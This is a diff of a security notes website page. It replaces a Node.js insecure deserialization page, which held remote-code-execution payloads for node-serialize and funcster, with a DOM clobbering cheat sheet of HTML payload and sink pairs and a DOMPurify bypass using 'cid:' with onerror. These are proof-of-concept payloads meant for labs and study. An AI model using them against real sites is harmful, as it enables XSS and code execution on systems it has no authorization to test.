@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Node insecure deserialization attacks - everything you need to know">
+<meta name="description" content="DOM Clobbering is a technique where global variables can be overwritten or &#34;clobbered&#34; by naming HTML elements with certain IDs or names. This can cause unexpected behavior in scripts and potentially lead to security vulnerabilities.">
 <meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Node Insecure Deserialization" />
-<meta property="og:description" content="Node insecure deserialization attacks - everything you need to know" />
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="DOM Clobbering" />
+<meta property="og:description" content="DOM Clobbering is a technique where global variables can be overwritten or &#34;clobbered&#34; by naming HTML elements with certain IDs or names. This can cause unexpected behavior in scripts and potentially lead to security vulnerabilities." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/insecure_deserialization/node/" /><meta property="article:section" content="docs" />
-<meta property="article:published_time" content="2023-03-27T00:00:00+00:00" />
-<meta property="article:modified_time" content="2023-03-27T18:40:36-04:00" />
-<title>Node Insecure Deserialization | Gray Hat Freelancing</title>
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/dom_clobbering/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2023-06-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-06-22T12:15:46-04:00" />
+<title>DOM Clobbering | Gray Hat Freelancing</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
@@ -101,7 +101,7 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/dom_clobbering/" class="">DOM Clobbering</a>
+    <a href="/docs/dom_clobbering/" class="active">DOM Clobbering</a>
   
 
         </li>
@@ -569,7 +569,7 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/insecure_deserialization/node/" class="active">Node Insecure Deserialization</a>
+    <a href="/docs/insecure_deserialization/node/" class="">Node Insecure Deserialization</a>
   
 
         </li>
@@ -1519,7 +1519,7 @@ https://github.com/alex-shpak/hugo-book
     <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Node Insecure Deserialization</strong>
+  <strong>DOM Clobbering</strong>
 
   <label for="toc-control">
     
@@ -1535,15 +1535,12 @@ https://github.com/alex-shpak/hugo-book
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#node-deserialization">Node Deserialization</a>
+    <li><a href="#dom-clobbering">Dom Clobbering</a>
       <ul>
         <li><a href="#summary">Summary</a></li>
-        <li><a href="#exploit">Exploit</a>
-          <ul>
-            <li><a href="#node-serialize">node-serialize</a></li>
-            <li><a href="#funcster">funcster</a></li>
-          </ul>
-        </li>
+        <li><a href="#lab">Lab</a></li>
+        <li><a href="#exploit">Exploit</a></li>
+        <li><a href="#tricks">Tricks</a></li>
         <li><a href="#references">References</a></li>
       </ul>
     </li>
@@ -1559,72 +1556,144 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="node-deserialization">
-  Node Deserialization
-  <a class="anchor" href="#node-deserialization">#</a>
+  <article class="markdown"><h1 id="dom-clobbering">
+  Dom Clobbering
+  <a class="anchor" href="#dom-clobbering">#</a>
 </h1>
+<blockquote>
+<p>DOM Clobbering is a technique where global variables can be overwritten or &ldquo;clobbered&rdquo; by naming HTML elements with certain IDs or names. This can cause unexpected behavior in scripts and potentially lead to security vulnerabilities.</p>
+</blockquote>
 <h2 id="summary">
   Summary
   <a class="anchor" href="#summary">#</a>
 </h2>
 <ul>
-<li><a href="#exploit">Exploit</a>
-<ul>
-<li><a href="#node-serialize">node-serialize</a></li>
-<li><a href="#funcster">funcster</a></li>
-</ul>
-</li>
+<li><a href="#lab">Lab</a></li>
+<li><a href="#exploit">Exploit</a></li>
 <li><a href="#references">References</a></li>
+</ul>
+<h2 id="lab">
+  Lab
+  <a class="anchor" href="#lab">#</a>
+</h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering">Lab: Exploiting DOM clobbering to enable XSS</a></li>
+<li><a href="https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters">Lab: Clobbering DOM attributes to bypass HTML filters</a></li>
+<li><a href="https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/">Lab: DOM clobbering test case protected by CSP</a></li>
 </ul>
 <h2 id="exploit">
   Exploit
   <a class="anchor" href="#exploit">#</a>
 </h2>
+<p>Exploitation requires any kind of <code>HTML injection</code> in the page.</p>
 <ul>
-<li>In Node source code, look for:
+<li>
+<p>Clobbering <code>x.y.value</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// Payload
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span>&gt;&lt;<span style="color:#f92672">output</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">y</span>&gt;I&#39;ve been clobbered&lt;/<span style="color:#f92672">output</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Sink
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">y</span>.<span style="color:#a6e22e">value</span>);&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div></li>
+<li>
+<p>Clobbering <code>x.y</code> using ID and name attributes together to form a DOM collection</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// Payload
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">y</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Clobbered&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Sink
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">y</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div></li>
+<li>
+<p>Clobbering <code>x.y.z</code> - 3 levels deep</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// Payload
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">y</span>&gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">z</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Sink
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">y</span>.<span style="color:#a6e22e">z</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div></li>
+<li>
+<p>Clobbering <code>a.b.c.d</code> - more than 3 levels</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// Payload
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">a</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;iframe srcdoc=&#39;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&#39; name=b&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">style</span>&gt;@<span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#39;//portswigger.net&#39;</span>;&lt;/<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Sink
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">d</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div></li>
+<li>
+<p>Clobbering <code>forEach</code> (Chrome only)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// Payload
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">y</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">z</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">y</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Sink
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">y</span>.<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">element</span>=&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">element</span>))&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div></li>
+<li>
+<p>Clobbering <code>document.getElementById()</code> using <code>&lt;html&gt;</code> or <code>&lt;body&gt;</code> tag with the same <code>id</code> attribute</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// Payloads
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cdnDomain&#34;</span>&gt;clobbered&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">cdnDomain</span>&gt;clobbered&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Sink 
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;cdnDomain&#39;</span>).<span style="color:#a6e22e">innerText</span>);<span style="color:#75715e">//clobbbered
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div></li>
+<li>
+<p>Clobbering <code>x.username</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// Payload
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ftp:Clobbered-username:Clobbered-Password@a&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Sink
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">username</span>)<span style="color:#75715e">//Clobbered-username
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">password</span>)<span style="color:#75715e">//Clobbered-password
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div></li>
+<li>
+<p>Clobbering (Firefox only)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// Payload
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">base</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">a:abc</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Firefox&lt;&gt;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Sink
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">x</span>)<span style="color:#75715e">//Firefox&lt;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div></li>
+<li>
+<p>Clobbering (Chrome only)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// Payload
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">base</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a://Clobbered&lt;&gt;&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">xyz</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">123</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Sink
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">xyz</span>)<span style="color:#75715e">//a://Clobbered&lt;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="tricks">
+  Tricks
+  <a class="anchor" href="#tricks">#</a>
+</h2>
 <ul>
-<li><code>node-serialize</code></li>
-<li><code>serialize-to-js</code></li>
-<li><code>funcster</code></li>
+<li>DomPurify allows the protocol <code>cid:</code>, which doesn&rsquo;t encode double quote (<code>&quot;</code>): <code>&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href=&quot;cid:&amp;quot;onerror=alert(1)//&quot;&gt;</code></li>
 </ul>
-</li>
-</ul>
-<h3 id="node-serialize">
-  node-serialize
-  <a class="anchor" href="#node-serialize">#</a>
-</h3>
-<blockquote>
-<p>An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the <code>unserialize()</code> function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).</p>
-</blockquote>
-<ol>
-<li>Generate a serialized payload
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rce</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(){
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;ls /&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">error</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">stdout</span>, <span style="color:#a6e22e">stderr</span>) { <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">stdout</span>) });
-</span></span><span style="display:flex;"><span>    },
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">serialize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;node-serialize&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Serialized: \n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">serialize</span>.<span style="color:#a6e22e">serialize</span>(<span style="color:#a6e22e">y</span>));
-</span></span></code></pre></div></li>
-<li>Add bracket <code>()</code> to force the execution
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;rce&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;_$$ND_FUNC$$_function(){require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error,stdout, stderr) { console.log(stdout) });}()&#34;</span>}
-</span></span></code></pre></div></li>
-<li>Send the payload</li>
-</ol>
-<h3 id="funcster">
-  funcster
-  <a class="anchor" href="#funcster">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;rce&#34;</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#34;__js_function&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;function(){CMD=\&#34;cmd /c calc\&#34;;const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()&#34;</span>}}
-</span></span></code></pre></div><h2 id="references">
+<h2 id="references">
   References
   <a class="anchor" href="#references">#</a>
 </h2>
 <ul>
-<li><a href="https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf">Exploiting Node.js deserialization bug for Remote Code Execution (CVE-2017-5941) - Ajin Abraham</a></li>
-<li><a href="https://blacksheephacks.pl/nodejs-deserialization/">NodeJS Deserialization - 8 January 2020- gonczor</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5941">CVE-2017-5941 - NATIONAL VULNERABILITY DATABASE - 02/09/2017</a></li>
+<li><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">Dom Clobbering - PortSwigger</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering">Dom Clobbering - HackTricks</a></li>
+<li><a href="https://portswigger.net/research/dom-clobbering-strikes-back">DOM Clobbering strikes back - @garethheyes - 06 February 2020</a></li>
+<li><a href="https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering">Hijacking service workers via DOM Clobbering - @garethheyes - 29 November 2022</a></li>
+<li><a href="https://portswigger.net/research/bypassing-csp-via-dom-clobbering">Bypassing CSP via DOM clobbering - @garethheyes - 05 June 2023</a></li>
 </ul>
 </article>
  
@@ -1635,9 +1704,9 @@ https://github.com/alex-shpak/hugo-book
   <div class="flex flex-wrap justify-between">
 
 
-  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/a70a7c086ba0501dbcf38a6c7abf94465a90dc20" title='Last modified by Stuart Gray | March 27, 2023' target="_blank" rel="noopener">
+  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/421b6a3226d33ea7c107a6ce319940d1100230b6" title='Last modified by Stuart Gray | June 22, 2023' target="_blank" rel="noopener">
       <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>March 27, 2023</span>
+      <span>June 22, 2023</span>
     </a>
   </div>
 
@@ -1669,15 +1738,12 @@ https://github.com/alex-shpak/hugo-book
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#node-deserialization">Node Deserialization</a>
+    <li><a href="#dom-clobbering">Dom Clobbering</a>
       <ul>
         <li><a href="#summary">Summary</a></li>
-        <li><a href="#exploit">Exploit</a>
-          <ul>
-            <li><a href="#node-serialize">node-serialize</a></li>
-            <li><a href="#funcster">funcster</a></li>
-          </ul>
-        </li>
+        <li><a href="#lab">Lab</a></li>
+        <li><a href="#exploit">Exploit</a></li>
+        <li><a href="#tricks">Tricks</a></li>
         <li><a href="#references">References</a></li>
       </ul>
     </li>
